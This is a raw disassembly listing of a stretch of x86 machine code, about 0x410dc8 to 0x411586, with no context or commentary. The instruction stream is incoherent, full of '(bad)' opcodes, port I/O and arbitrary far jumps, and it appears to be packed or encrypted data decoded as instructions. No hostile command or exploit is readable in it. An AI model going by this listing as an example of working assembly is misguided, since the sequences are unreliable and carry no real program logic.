  410dc8:	or     esi,0xffffffcb
  410dcb:	xchg   edx,eax
  410dcc:	inc    esi
  410dcd:	scas   al,BYTE PTR es:[edi]
  410dce:	out    0x87,eax
  410dd0:	(bad)  
  410dd1:	(bad)  
  410dd3:	int    0x40
  410dd5:	mov    dl,0x9c
  410dd7:	push   esi
  410dd8:	ins    BYTE PTR es:[edi],dx
  410dd9:	mov    bl,BYTE PTR [ecx+0x4e]
  410ddc:	pop    es
  410ddd:	(bad)  
  410dde:	(bad)  
  410ddf:	das    
  410de0:	inc    edx
  410de1:	ja     0x410e19
  410de3:	push   ss
  410de4:	(bad)  
  410de5:	jmp    0xb9a7:0x5b56de4c
  410dec:	leave  
  410ded:	scas   eax,DWORD PTR es:[edi]
  410dee:	out    0x92,eax
  410df0:	mov    cl,0xe7
  410df2:	cwde   
  410df3:	sub    esi,ecx
  410df5:	out    0xf4,eax
  410df7:	xchg   ebx,eax
  410df8:	push   esp
  410df9:	dec    ebx
  410dfa:	inc    edi
  410dfb:	dec    esp
  410dfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410dfd:	adc    DWORD PTR [edi+0x1c1cbfc6],0xcd56a1af
  410e07:	sbb    DWORD PTR [eax+esi*2+0x66],edx
  410e0b:	les    edi,FWORD PTR [edx+0x70]
  410e0e:	cld    
  410e0f:	inc    edi
  410e10:	scas   eax,DWORD PTR es:[edi]
  410e11:	stos   DWORD PTR es:[edi],eax
  410e12:	pusha  
  410e13:	dec    edi
  410e14:	out    dx,eax
  410e15:	lahf   
  410e16:	mov    dh,BYTE PTR [esi+0x6be3d75f]
  410e1c:	and    ah,al
  410e1e:	sub    al,0x2d
  410e20:	xor    al,0x79
  410e22:	into   
  410e23:	push   0xffffff87
  410e25:	rcl    DWORD PTR [edi],cl
  410e27:	jg     0x410e30
  410e29:	sub    al,0x97
  410e2b:	lahf   
  410e2c:	xor    eax,0xb84ab5a5
  410e31:	fs stc 
  410e33:	shl    DWORD PTR [ecx],0x13
  410e36:	pop    edx
  410e37:	sub    ch,BYTE PTR [edx+0x56ff7e86]
  410e3d:	or     ecx,ebx
  410e3f:	jmp    0x99187939
  410e44:	in     eax,0x24
  410e46:	aaa    
  410e47:	push   cs
  410e48:	jmp    0x3810:0x186b8811
  410e4f:	push   eax
  410e50:	jne    0x410e0a
  410e52:	fsub   QWORD PTR [esi+0x7]
  410e55:	inc    ebp
  410e56:	jae    0x410e98
  410e58:	call   0x3f24:0x3743575d
  410e5f:	jns    0x410def
  410e61:	inc    ecx
  410e62:	adc    DWORD PTR [edx+0x4e],edx
  410e65:	fild   QWORD PTR [edi+0x43]
  410e68:	jne    0x410e91
  410e6a:	jg     0x410ed7
  410e6c:	rcr    BYTE PTR [ebx-0x14],1
  410e6f:	fwait
  410e70:	pop    esp
  410e71:	fsub   QWORD PTR [eax]
  410e73:	pop    edx
  410e74:	jge    0x410df7
  410e76:	mov    al,0x83
  410e78:	sbb    esi,edi
  410e7a:	xor    edx,DWORD PTR [ebx+0x383e6770]
  410e80:	dec    esi
  410e81:	and    BYTE PTR ds:0x83dc853c,al
  410e87:	mov    ebx,0xdcda3f4f
  410e8c:	lock leave 
  410e8e:	fisttp DWORD PTR [ebx+esi*4]
  410e91:	cmp    dl,BYTE PTR [ebx]
  410e93:	pop    ebp
  410e94:	and    bl,ah
  410e96:	pop    ecx
  410e97:	or     DWORD PTR [edi-0x54],esp
  410e9a:	lock cmp edi,DWORD PTR [edx-0x4f]
  410e9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e9f:	ins    BYTE PTR es:[edi],dx
  410ea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ea1:	or     cl,BYTE PTR [esi-0x57e3b3ce]
  410ea7:	rcl    BYTE PTR [ecx-0x45a3db5c],cl
  410ead:	das    
  410eae:	fisubr WORD PTR [edx-0x21]
  410eb1:	push   0xffffff9a
  410eb3:	int3   
  410eb4:	ins    BYTE PTR es:[edi],dx
  410eb5:	aam    0x73
  410eb7:	iret   
  410eb8:	(bad)  
  410eb9:	mov    ds:0x8c28fe03,al
  410ebe:	inc    eax
  410ebf:	jge    0x410e6d
  410ec1:	fs gs cs push 0x101190c3
  410ec9:	mov    al,0x4c
  410ecb:	clc    
  410ecc:	repz pop DWORD PTR [esi+ecx*8+0x2c6979ce]
  410ed4:	dec    esp
  410ed5:	jne    0x410e7f
  410ed7:	sub    DWORD PTR [edx+0x1f203deb],edi
  410edd:	mov    ebp,0x1cca0934
  410ee2:	icebp  
  410ee3:	in     eax,0x54
  410ee5:	sbb    esi,DWORD PTR [esi-0x3904bffc]
  410eeb:	sar    DWORD PTR [edi-0x35a1c539],0x68
  410ef2:	ins    BYTE PTR es:[edi],dx
  410ef3:	push   edi
  410ef4:	ret    0x2162
  410ef7:	call   0x53d2:0xdc71e950
  410efe:	das    
  410eff:	(bad)  
  410f01:	cmp    ch,BYTE PTR [esi-0x883036e]
  410f07:	sbb    esp,ebp
  410f09:	lods   al,BYTE PTR ds:[esi]
  410f0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f0b:	in     al,0x5a
  410f0d:	mov    ch,0x16
  410f0f:	jecxz  0x410eb5
  410f11:	test   DWORD PTR [esi],0x1c1f9653
  410f17:	sbb    bh,ah
  410f19:	mov    ds,WORD PTR [edi-0x10]
  410f1c:	pop    ds
  410f1d:	js     0x410f5b
  410f1f:	xchg   ecx,eax
  410f20:	adc    ebp,DWORD PTR [ecx+ecx*2+0x622a524d]
  410f27:	xchg   BYTE PTR [edx],cl
  410f29:	dec    edx
  410f2a:	js     0x410edd
  410f2c:	cwde   
  410f2d:	jge    0x410ef6
  410f2f:	xor    esp,DWORD PTR [ebx]
  410f31:	lahf   
  410f32:	iret   
  410f33:	fisubr DWORD PTR [eax-0x62]
  410f36:	iret   
  410f37:	adc    eax,0xbae97dd
  410f3c:	jmp    0x410fac
  410f3e:	cmp    bh,dl
  410f40:	push   ecx
  410f41:	mov    ds:0xe4ad8f08,eax
  410f46:	dec    esp
  410f47:	adc    eax,0x762cf1e
  410f4c:	es jp  0x410fae
  410f4f:	mov    ah,0xfa
  410f51:	xchg   ecx,eax
  410f52:	sbb    dl,dl
  410f54:	mov    BYTE PTR [ecx],ch
  410f56:	fld    TBYTE PTR [ecx+ebp*1]
  410f59:	call   0x877b:0x72d626ee
  410f60:	and    BYTE PTR [edi-0x15],cl
  410f63:	stc    
  410f64:	mov    dh,0x3c
  410f66:	jle    0x410ee9
  410f68:	sub    eax,0xb5a05151
  410f6d:	test   DWORD PTR [edx+esi*1+0x3fce9111],eax
  410f74:	sbb    BYTE PTR [ebx],ch
  410f76:	(bad)  
  410f77:	das    
  410f78:	mov    esp,0x7cb6f26d
  410f7d:	sbb    bh,al
  410f7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f80:	hlt    
  410f81:	inc    edi
  410f82:	jne    0x410fd7
  410f84:	std    
  410f85:	mov    eax,ds:0x97b056d9
  410f8a:	jb     0x411006
  410f8c:	xchg   edi,eax
  410f8d:	mov    bh,0xb2
  410f8f:	xchg   BYTE PTR [eax+0x35],bh
  410f92:	cwde   
  410f93:	std    
  410f94:	ins    BYTE PTR es:[edi],dx
  410f95:	sahf   
  410f96:	push   es
  410f97:	imul   ecx,DWORD PTR [ebp+0x48],0xffffffb9
  410f9b:	push   ebx
  410f9c:	dec    ebp
  410f9d:	shl    DWORD PTR [esi],cl
  410f9f:	sbb    al,0x45
  410fa1:	addr16 add eax,0x9971d582
  410fa7:	dec    edi
  410fa8:	adc    BYTE PTR [edx],dh
  410faa:	adc    ecx,DWORD PTR [esi-0x6d]
  410fad:	pushf  
  410fae:	(bad)  
  410faf:	sbb    al,0xf2
  410fb1:	es retf 
  410fb3:	jno    0x410fea
  410fb5:	mov    eax,DWORD PTR [edi+0x75e3d6ec]
  410fbb:	sbb    eax,0xc69e06d2
  410fc0:	enter  0x182d,0x64
  410fc4:	fstp   DWORD PTR [ebx-0x6c]
  410fc7:	pop    edi
  410fc8:	nop
  410fc9:	mov    ch,BYTE PTR [ebx+0x26]
  410fcc:	or     dl,bh
  410fce:	or     BYTE PTR [ebp-0x644de103],ch
  410fd4:	and    DWORD PTR [ebp+0x53],esp
  410fd7:	add    edi,ecx
  410fd9:	jmp    0x411261
  410fde:	int3   
  410fdf:	into   
  410fe0:	ror    esp,0xc1
  410fe3:	rcl    ecx,cl
  410fe5:	into   
  410fe6:	jbe    0x410f92
  410fe8:	inc    esp
  410fe9:	data16 jne 0x410fcd
  410fec:	mov    ecx,0x785a6512
  410ff1:	js     0x410fd8
  410ff3:	jle    0x41106d
  410ff5:	js     0x410fd9
  410ff7:	and    ebp,esi
  410ff9:	fwait
  410ffa:	sub    eax,DWORD PTR [di-0x3105]
  410fff:	cmp    cl,BYTE PTR fs:[ebx]
  411002:	js     0x410ffd
  411004:	test   al,0xaf
  411006:	out    dx,eax
  411007:	stc    
  411008:	jp     0x411088
  41100a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41100b:	mov    dh,0xb0
  41100d:	adc    ch,BYTE PTR [ebx+0x7c]
  411010:	fldenvw [eax-0x408169e5]
  411017:	lahf   
  411018:	dec    ebp
  411019:	adc    esi,DWORD PTR [ebp-0x290919f8]
  41101f:	sbb    BYTE PTR [ebx],0xcb
  411022:	xchg   edx,eax
  411023:	fld    TBYTE PTR [edi+0x1c839615]
  411029:	xchg   esi,eax
  41102a:	push   esi
  41102b:	es add dh,dh
  41102e:	sahf   
  41102f:	sub    DWORD PTR [esi+eiz*1+0x1c],0x2a
  411034:	push   ds
  411035:	data16 fisubr DWORD PTR [ebx]
  411038:	cmc    
  411039:	xchg   BYTE PTR fs:[eax-0x4670a8f6],cl
  411040:	adc    DWORD PTR [edi-0x282da442],ebp
  411046:	dec    edi
  411047:	popw   ss
  411049:	and    al,0xf0
  41104b:	and    eax,0x73f6cc3a
  411050:	dec    edx
  411051:	cwde   
  411052:	dec    eax
  411053:	icebp  
  411054:	xor    al,0xed
  411056:	mov    edi,0xbddc4d85
  41105b:	sub    DWORD PTR [ebp-0x2c],edi
  41105e:	sub    edi,ebx
  411060:	repnz xor BYTE PTR [ecx],bh
  411063:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411064:	or     BYTE PTR [ecx],bh
  411066:	fsubr  QWORD PTR [ecx+0xf]
  411069:	es xor esi,ecx
  41106c:	push   esp
  41106d:	mov    eax,ds:0x3e6c95b4
  411072:	jge    0x41105f
  411074:	sti    
  411075:	xchg   DWORD PTR [ecx+0x76],esi
  411078:	pusha  
  411079:	jo     0x41109b
  41107b:	ja     0x41106f
  41107d:	xor    BYTE PTR [eax],bl
  41107f:	icebp  
  411080:	sbb    esi,DWORD PTR [ecx]
  411082:	not    BYTE PTR [esi-0x21]
  411085:	xchg   esp,eax
  411086:	mov    WORD PTR ds:0x1fad5758,?
  41108c:	fisubr DWORD PTR [edi+eiz*2]
  41108f:	jo     0x41107a
  411091:	int3   
  411092:	cmp    cl,BYTE PTR [ebx+0x4b]
  411095:	and    DWORD PTR [edi-0x15],esi
  411098:	inc    eax
  411099:	mov    edx,0x24dab8c9
  41109e:	xlat   BYTE PTR ds:[ebx]
  41109f:	cmp    al,0x89
  4110a1:	pop    ebp
  4110a2:	outs   dx,BYTE PTR ds:[esi]
  4110a3:	jmp    0x4512:0x307435c0
  4110aa:	push   cs
  4110ab:	inc    esp
  4110ac:	nop
  4110ad:	cmp    eax,0x6e54998b
  4110b2:	xchg   esi,eax
  4110b3:	mov    dl,0xf0
  4110b5:	out    dx,eax
  4110b6:	repz les ebp,FWORD PTR [eax-0x1740354a]
  4110bd:	(bad)  
  4110be:	aad    0x6f
  4110c0:	je     0x4110f4
  4110c2:	add    edi,DWORD PTR [edi]
  4110c4:	retf   
  4110c5:	test   BYTE PTR [edx+eiz*1-0x13716d79],cl
  4110cc:	fwait
  4110cd:	popf   
  4110ce:	mov    ebp,0xc4616625
  4110d3:	dec    esp
  4110d4:	sub    BYTE PTR [eax-0x6d],ch
  4110d7:	and    dh,bh
  4110d9:	jmp    0xaf05e0e
  4110de:	not    DWORD PTR [ebp+0x2cdb7740]
  4110e4:	and    al,0x81
  4110e6:	ret    
  4110e7:	ss push esi
  4110e9:	inc    ebp
  4110ea:	in     eax,0xf4
  4110ec:	add    DWORD PTR [ecx+ebp*4],ebp
  4110ef:	push   0xb5d3abb4
  4110f4:	or     edi,DWORD PTR [ebx-0x4ab2713b]
  4110fa:	loop   0x41112f
  4110fc:	(bad)  
  4110fd:	sbb    BYTE PTR [ecx-0x77],dh
  411100:	cld    
  411101:	sbb    al,0xc8
  411103:	add    al,0x75
  411105:	mov    edx,0xa20a66f9
  41110a:	mov    eax,DWORD PTR [edi]
  41110c:	cmc    
  41110d:	sbb    edx,DWORD PTR [edx]
  41110f:	int3   
  411110:	sub    BYTE PTR [ebp+0x30],dh
  411113:	aam    0x13
  411115:	cmc    
  411116:	or     DWORD PTR [edx-0x1d12c416],ebp
  41111c:	lea    ebp,[ecx-0x1b]
  41111f:	sub    dh,BYTE PTR [eax+eiz*4-0x27fd4712]
  411126:	fstp   TBYTE PTR [eax]
  411128:	xchg   ecx,eax
  411129:	call   0x5c3f84e9
  41112e:	pop    ds
  41112f:	fimul  WORD PTR [ecx-0x28]
  411132:	adc    eax,0x3819dc05
  411137:	mov    ebp,0x83854b82
  41113c:	test   DWORD PTR [ebx-0x6ebf9d1e],esp
  411142:	mov    esp,0x75a47aa3
  411147:	pusha  
  411148:	pop    esp
  411149:	repz daa 
  41114b:	mov    dh,0x53
  41114d:	and    edi,DWORD PTR [esi-0x2f4636f0]
  411153:	xor    cl,BYTE PTR [edi]
  411155:	inc    ebx
  411156:	mov    ah,0x59
  411158:	or     eax,0xfa420382
  41115d:	and    dh,BYTE PTR [edx+0x623d5031]
  411163:	push   eax
  411164:	pusha  
  411165:	push   0xa4a0a64d
  41116a:	inc    ebx
  41116b:	xor    al,0xc8
  41116d:	jb     0x4111ed
  41116f:	mov    esp,0x9340f14e
  411174:	out    dx,eax
  411175:	adc    DWORD PTR [ebp+0x274bf9d6],ecx
  41117b:	out    dx,eax
  41117c:	push   esi
  41117d:	pushf  
  41117e:	rcr    BYTE PTR [edi-0x5c],cl
  411181:	jmp    esp
  411183:	outs   dx,DWORD PTR ds:[esi]
  411184:	retf   
  411185:	pop    esp
  411186:	fldenv [edx+0x6c]
  411189:	add    al,0x60
  41118b:	fwait
  41118c:	dec    esi
  41118d:	sahf   
  41118e:	cli    
  41118f:	sub    DWORD PTR [ebp+edx*4+0x7e7a34f2],ecx
  411196:	sbb    al,0xfd
  411198:	xchg   BYTE PTR [edx-0x138816c2],bh
  41119e:	test   eax,0x486d322f
  4111a3:	retf   0x8058
  4111a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111a7:	sbb    al,cl
  4111a9:	pop    edx
  4111aa:	idiv   DWORD PTR [esi]
  4111ac:	je     0x411187
  4111ae:	ins    DWORD PTR es:[edi],dx
  4111af:	pop    ebx
  4111b0:	sbb    BYTE PTR [ebx],dl
  4111b2:	mov    ds:0x891656ad,eax
  4111b7:	fisub  DWORD PTR [ecx-0x7a]
  4111ba:	push   esi
  4111bb:	aaa    
  4111bc:	pusha  
  4111bd:	nop
  4111be:	xchg   esp,eax
  4111bf:	popf   
  4111c0:	cmp    ch,al
  4111c2:	jbe    0x41115e
  4111c4:	ins    DWORD PTR es:[edi],dx
  4111c5:	repz loope 0x4111df
  4111c8:	arpl   WORD PTR [esi+0x190b74a6],ax
  4111ce:	(bad)  
  4111cf:	out    dx,eax
  4111d0:	repz call 0xbbd8b69d
  4111d6:	sbb    eax,0x81cda967
  4111db:	xlat   BYTE PTR ds:[ebx]
  4111dc:	inc    ecx
  4111dd:	mov    esp,0x5673ae45
  4111e2:	mov    ch,0xe2
  4111e4:	pusha  
  4111e5:	mov    al,0x25
  4111e7:	test   eax,0xad60a321
  4111ec:	mov    cl,dh
  4111ee:	cmp    edx,DWORD PTR [ebx]
  4111f0:	cmp    eax,0x3e210e8f
  4111f5:	pop    edx
  4111f6:	popf   
  4111f7:	addr16 mov eax,0x8f09c2ed
  4111fd:	dec    esi
  4111fe:	(bad)  
  4111ff:	cmp    al,0x82
  411201:	inc    edx
  411202:	das    
  411203:	pusha  
  411204:	sub    al,0xff
  411206:	stos   BYTE PTR es:[edi],al
  411207:	xchg   edx,eax
  411208:	stos   DWORD PTR es:[edi],eax
  411209:	mov    ecx,0xe46ba9e
  41120e:	js     0x411223
  411210:	mov    BYTE PTR [ecx-0x2d439f75],bh
  411216:	cmp    ch,ah
  411218:	neg    bh
  41121a:	push   0x599be16c
  41121f:	in     eax,0xf7
  411221:	cwde   
  411222:	imul   ecx,DWORD PTR [ebp-0x77]
  411226:	dec    esi
  411227:	test   BYTE PTR [esi-0x69],0x12
  41122b:	sbb    BYTE PTR [edi-0x46fa2648],al
  411231:	sbb    eax,0x284d62b4
  411236:	out    0xfc,al
  411238:	pop    ss
  411239:	xchg   esp,eax
  41123a:	or     bh,bh
  41123c:	and    al,0xbe
  41123f:	mov    eax,0x6cdd1ad4
  411244:	sbb    BYTE PTR [esi+0x57ed7ec0],cl
  41124a:	mov    cl,0x28
  41124c:	jo     0x4111e5
  41124e:	push   ss
  41124f:	lods   eax,DWORD PTR ds:[esi]
  411250:	cmc    
  411251:	sbb    al,0x51
  411253:	mov    BYTE PTR [edi],dl
  411255:	cmp    DWORD PTR [edi-0x279a1dba],0x1646845a
  41125f:	xchg   ecx,eax
  411260:	inc    eax
  411261:	add    edx,ecx
  411263:	imul   edx,edi
  411266:	jmp    0x4114ee
  41126b:	aas    
  41126c:	xlat   BYTE PTR ds:[ebx]
  41126d:	xlat   BYTE PTR ds:[ebx]
  41126e:	retf   
  41126f:	xlat   BYTE PTR ds:[ebx]
  411270:	retf   
  411271:	rcr    ebx,cl
  411273:	and    cl,ah
  411275:	or     BYTE PTR [eax-0x11],al
  411278:	add    edx,DWORD PTR [eax]
  41127a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41127b:	rcr    BYTE PTR [edi+0x78],cl
  41127e:	js     0x411265
  411280:	jle    0x4112fa
  411282:	js     0x4112bd
  411284:	out    dx,eax
  411285:	xchg   ebx,eax
  411286:	jg     0x4112ab
  411288:	cmp    eax,0x91ceb48a
  41128d:	pop    ecx
  41128e:	jge    0x4112d4
  411290:	call   0xdc80fb58
  411295:	test   BYTE PTR [edi+0x73],dh
  411298:	mov    DWORD PTR [edi+0x56a8af99],ecx
  41129e:	sti    
  41129f:	aam    0xa0
  4112a1:	pop    edi
  4112a2:	mov    esi,DWORD PTR [ebp+ebp*2+0x40]
  4112a6:	cwde   
  4112a7:	fist   WORD PTR [esi]
  4112a9:	jp     0x411271
  4112ab:	(bad)  
  4112ac:	daa    
  4112ad:	inc    esi
  4112ae:	out    0x3e,al
  4112b0:	lea    ebp,[ebp+0x42]
  4112b3:	xchg   edi,eax
  4112b4:	(bad)  
  4112b6:	xchg   edx,eax
  4112b7:	inc    ebp
  4112b8:	enter  0x8e41,0xb9
  4112bc:	sbb    edi,DWORD PTR [edi+0x79]
  4112bf:	push   cs
  4112c0:	fidivr WORD PTR [edx]
  4112c2:	xor    eax,0xbcd0d34b
  4112c7:	mov    ecx,0xdece4d56
  4112cc:	mov    bl,bl
  4112ce:	neg    DWORD PTR [ebx-0x5a583e9e]
  4112d4:	pop    edi
  4112d5:	mov    bl,0xb3
  4112d7:	jne    0x411302
  4112d9:	dec    esi
  4112da:	mov    al,0x65
  4112dc:	pop    ecx
  4112dd:	jecxz  0x4112cc
  4112df:	cs push edi
  4112e1:	mov    dh,0x4a
  4112e3:	dec    edi
  4112e4:	out    dx,al
  4112e5:	mov    edi,0x154ed9e1
  4112ea:	dec    ebp
  4112eb:	(bad)  
  4112ec:	aas    
  4112ed:	icebp  
  4112ee:	mov    esp,0x6646c38a
  4112f3:	(bad)  
  4112f5:	fild   WORD PTR [edi+0x23838e13]
  4112fb:	or     BYTE PTR [ebx],dh
  4112fd:	push   edi
  4112fe:	(bad)  
  4112ff:	(bad)  
  411300:	jmp    0x411295
  411302:	ret    
  411303:	push   es
  411304:	(bad)  
  411305:	adc    DWORD PTR [ecx+esi*2],edx
  411308:	fbstp  TBYTE PTR [eax]
  41130a:	push   edx
  41130b:	in     eax,dx
  41130c:	jg     0x4112c6
  41130e:	mov    ch,0xe7
  411310:	mov    dh,0xbb
  411312:	mov    ecx,0x4bd35f28
  411317:	les    esi,FWORD PTR [eax-0x20]
  41131a:	pop    esi
  41131b:	sbb    BYTE PTR [edi+0x39],ah
  41131e:	pop    esi
  41131f:	jo     0x411323
  411321:	inc    edi
  411322:	xchg   ebx,eax
  411323:	inc    ebp
  411324:	ins    BYTE PTR es:[edi],dx
  411325:	xchg   ebp,eax
  411326:	retf   
  411327:	xor    eax,DWORD PTR [ebx-0x2df5f70e]
  41132d:	imul   BYTE PTR [esi]
  41132f:	test   edx,ebx
  411331:	mov    ds:0xaec9817a,al
  411336:	mov    esp,0x3b4e8d48
  41133c:	jle    0x4112ca
  41133e:	push   ss
  41133f:	leave  
  411340:	mov    ch,0x81
  411342:	fdivr  QWORD PTR [edx+0x35]
  411345:	mov    ch,0xb5
  411347:	mov    ds:0x508f150d,al
  41134c:	dec    edi
  41134d:	mov    bl,0x40
  41134f:	shr    DWORD PTR [ebx],0xa6
  411352:	in     al,dx
  411353:	pop    ss
  411354:	lock jmp 0xb861:0xf33980e
  41135c:	fisub  WORD PTR [ecx+0xed8b90d]
  411362:	jne    0x4113d8
  411364:	rcl    ebp,1
  411366:	and    esi,DWORD PTR [ebp-0x4eabdc9b]
  41136c:	test   eax,0x4fb01d34
  411371:	mov    bh,0x30
  411373:	std    
  411374:	aam    0x39
  411376:	fcom   DWORD PTR [eax+0x5f]
  411379:	add    eax,0xe0ac16f1
  41137e:	loope  0x4113b2
  411380:	add    dl,al
  411382:	pop    eax
  411383:	(bad)  
  411384:	dec    edi
  411385:	shl    BYTE PTR [eax+0x62c2d51b],0xd7
  41138c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41138d:	or     BYTE PTR [ebx],0x35
  411390:	mov    al,0x8e
  411392:	retf   0x876c
  411395:	jmp    0x411353
  411397:	sbb    edi,DWORD PTR [esi]
  411399:	out    dx,eax
  41139a:	cmp    eax,0x50af22e3
  41139f:	mov    eax,0x1e381a73
  4113a4:	aad    0xba
  4113a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113a7:	jecxz  0x41136c
  4113a9:	push   0x42
  4113ab:	mov    ch,0xb1
  4113ad:	mov    edx,0x5e155839
  4113b2:	mov    BYTE PTR [edx-0xaf6908f],ah
  4113b8:	xchg   bh,bh
  4113ba:	sub    ebp,DWORD PTR [edi+edx*8+0xe84df24]
  4113c1:	cmp    DWORD PTR [eax-0x3b],esp
  4113c4:	xor    dh,BYTE PTR [ecx+ecx*4+0x20af770a]
  4113cb:	xlat   BYTE PTR ds:[ebx]
  4113cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113cd:	fld    DWORD PTR [edx+0x54]
  4113d0:	gs jb  0x411370
  4113d3:	lahf   
  4113d4:	pop    ecx
  4113d5:	pop    edi
  4113d6:	ror    al,1
  4113d8:	push   ecx
  4113d9:	push   0x3f
  4113db:	mov    ds:0xae68d2e1,eax
  4113e1:	test   al,0x25
  4113e3:	cmp    eax,DWORD PTR [ebx+0x69]
  4113e6:	sbb    DWORD PTR [eax+0x2f],ebp
  4113e9:	jmp    0x80f4:0xe7df40bf
  4113f0:	inc    esi
  4113f1:	and    dl,dh
  4113f3:	leave  
  4113f4:	loopne 0x411391
  4113f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113f7:	mov    edx,DWORD PTR [edi+edi*4]
  4113fa:	mov    al,ch
  4113fc:	sub    DWORD PTR [ebx+ebx*8-0x67c73381],edx
  411403:	(bad)  
  411404:	neg    ebx
  411406:	outs   dx,DWORD PTR ds:[esi]
  411407:	fwait
  411408:	shl    DWORD PTR [edx+0x1fce0f5a],cl
  41140e:	ins    BYTE PTR es:[edi],dx
  41140f:	dec    edi
  411410:	pop    esp
  411411:	stos   DWORD PTR es:[edi],eax
  411412:	mov    ch,0x18
  411414:	pop    esp
  411415:	cli    
  411416:	ss inc ebx
  411418:	or     DWORD PTR ss:[edx],0x976116b6
  41141f:	loop   0x411405
  411421:	sub    bh,BYTE PTR [edi+0x24]
  411424:	push   edi
  411425:	sti    
  411426:	jbe    0x4113f2
  411428:	pop    edx
  411429:	ds dec edi
  41142b:	push   ebx
  41142c:	not    DWORD PTR [ebx]
  41142e:	jecxz  0x41141a
  411430:	lock cmp ebx,DWORD PTR [esi]
  411433:	jg     0x4113e9
  411435:	cmp    eax,0x2f37135d
  41143a:	retf   
  41143b:	iret   
  41143c:	loopne 0x41146f
  41143e:	pop    eax
  41143f:	inc    ecx
  411440:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411441:	retf   0xc26f
  411444:	pop    edx
  411445:	sub    al,0xaa
  411447:	sub    al,0x83
  411449:	js     0x41140c
  41144b:	xor    BYTE PTR [eax+0x0],bh
  41144e:	lea    esi,[edx-0x3d3cf8a3]
  411454:	je     0x41149c
  411456:	pop    eax
  411457:	test   BYTE PTR [ebp-0x15],0xdd
  41145b:	in     al,0x7e
  41145d:	outs   dx,DWORD PTR ds:[esi]
  41145e:	xor    dl,BYTE PTR [esi+0x19a13ed9]
  411464:	sub    BYTE PTR [ecx+0x3d],dh
  411467:	shr    cl,0x1c
  41146a:	jns    0x411440
  41146c:	das    
  41146d:	cmp    BYTE PTR [edx],0x55
  411470:	enter  0x78de,0x70
  411474:	movlps QWORD PTR [ebp-0x62],xmm7
  411478:	and    eax,0x5dcfabfb
  41147d:	sbb    DWORD PTR [edi],edi
  41147f:	cmp    ebp,DWORD PTR [edx+0x32]
  411482:	test   DWORD PTR [edx+0x5d],edi
  411485:	sbb    al,0x98
  411487:	cli    
  411488:	(bad)  
  411489:	enter  0x87fa,0x4
  41148d:	sub    edx,0xffffffcf
  411490:	popf   
  411491:	cmp    eax,0x7a819399
  411496:	(bad)  
  411497:	test   eax,0x762c0aa3
  41149c:	pop    ecx
  41149d:	xor    al,0xaf
  41149f:	enter  0xaf98,0x3d
  4114a3:	mov    BYTE PTR [ebx],bh
  4114a5:	stc    
  4114a6:	add    eax,0xb7a096c8
  4114ab:	cmp    edi,DWORD PTR [eax-0x4f]
  4114ae:	and    al,0xdf
  4114b0:	push   es
  4114b1:	push   ebx
  4114b2:	out    dx,eax
  4114b3:	cwde   
  4114b4:	inc    esp
  4114b5:	push   cs
  4114b6:	dec    esp
  4114b7:	inc    ecx
  4114b8:	inc    ebp
  4114b9:	mov    dl,0xb1
  4114bb:	(bad)  
  4114bc:	arpl   WORD PTR [esi-0x4c],bp
  4114bf:	jbe    0x4114ca
  4114c1:	and    ah,BYTE PTR [edx+0x38]
  4114c4:	push   esi
  4114c5:	sti    
  4114c6:	or     ebp,ebp
  4114c8:	adc    eax,0x83a9f278
  4114cd:	aaa    
  4114ce:	jl     0x411495
  4114d0:	int    0xb7
  4114d2:	rcr    al,0x0
  4114d5:	int    0x24
  4114d7:	xchg   edi,eax
  4114d8:	sti    
  4114d9:	cmp    DWORD PTR [ebx+ebx*8],0xa9d0c389
  4114e0:	push   edi
  4114e1:	or     DWORD PTR [edi-0x745d971],ebx
  4114e7:	adc    ah,dl
  4114e9:	cmp    DWORD PTR ds:0x8bfa3d43,0x7d
  4114f0:	clc    
  4114f1:	mov    ebx,DWORD PTR [ebp-0x10]
  4114f4:	sub    ebx,edi
  4114f6:	cmp    ebx,edx
  4114f8:	ja     0x41178e
  4114fe:	jmp    0x411786
  411503:	(bad)  
  411504:	rol    edi,cl
  411506:	(bad)
  411509:	(bad)
  41150c:	xor    bl,BYTE PTR [edi+0x4e]
  41150f:	mov    ?,WORD PTR [ebx]
  411511:	xchg   ebx,eax
  411512:	nop
  411513:	mov    edi,0xe578785d
  411518:	jle    0x411592
  41151a:	js     0x411577
  41151c:	xchg   esi,eax
  41151d:	mov    al,ds:0x5061a105
  411522:	or     eax,DWORD PTR [ebp-0x3753b95]
  411528:	sub    dl,ah
  41152a:	je     0x4114d3
  41152c:	or     al,0x96
  41152e:	push   es
  41152f:	xchg   edi,eax
  411530:	in     al,dx
  411531:	arpl   WORD PTR [eax],di
  411533:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411534:	sbb    DWORD PTR [esi],ebx
  411536:	mov    al,ds:0x8f101f17
  41153b:	int3   
  41153c:	out    dx,eax
  41153d:	outs   dx,DWORD PTR ds:[esi]
  41153e:	push   0x32
  411540:	mov    ebp,0xb69e2e55
  411545:	loope  0x411585
  411547:	mov    bl,0x7d
  411549:	jno    0x41150f
  41154b:	inc    edi
  41154c:	sbb    ebx,esi
  41154e:	nop
  41154f:	dec    edx
  411550:	cmp    DWORD PTR [edi-0x32d406f1],ebp
  411556:	cmp    BYTE PTR [esi-0x1adf8644],ah
  41155c:	mov    ds:0x419a43d8,al
  411561:	mov    al,0x95
  411563:	or     al,0xea
  411565:	test   ecx,eax
  411567:	push   ds
  411568:	fwait
  411569:	jo     0x411583
  41156b:	pusha  
  41156c:	sbb    BYTE PTR ds:0x960b2fce,0xb6
  411573:	mov    ebp,0x1eaa8999
  411578:	push   esi
  411579:	inc    ecx
  41157a:	imul   edx,DWORD PTR [esi+0x705968c3],0xa
  411581:	adc    ecx,DWORD PTR [edi+0x2d]
  411584:	lahf   
  411585:	popa   
  411586:	hlt    
